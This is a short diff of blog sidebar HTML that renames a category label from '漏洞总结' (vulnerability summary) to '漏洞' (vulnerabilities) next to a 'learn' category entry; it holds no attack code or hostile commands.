             <span class="iconfont-archer">&#xe60a;</span>
-            漏洞总结
+            漏洞
         </span>
     
         <span class="sidebar-category-name" data-categories="learn">
